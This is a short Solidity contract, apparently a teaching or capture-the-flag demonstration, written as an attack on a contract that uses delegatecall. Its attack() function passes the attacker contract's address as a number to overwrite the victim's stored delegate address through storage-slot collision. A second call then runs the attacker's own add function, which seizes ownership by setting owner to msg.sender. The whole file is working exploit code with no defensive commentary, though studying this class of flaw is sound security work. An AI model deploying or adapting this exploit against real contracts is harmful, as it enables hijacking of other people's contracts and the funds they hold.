// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface DelegateExample {
    function add(uint256 num1, uint256 num2) external returns (uint256);
}


contract DelegateExampleAttack {
    address public mainAddress;
    address public owner;
    uint256 public result;

    address delegateContractAddress;

    constructor(address _delegateContractAddress) {
        delegateContractAddress = _delegateContractAddress;
    }

    function attack() public {
        DelegateExample(delegateContractAddress).add(uint256(uint160(address(this))), 0);
        DelegateExample(delegateContractAddress).add(1,2);
    }

    function add(uint256 num1, uint256 num2) external returns (uint256) {
        owner = msg.sender;
        return num1 + num2;
    }
}
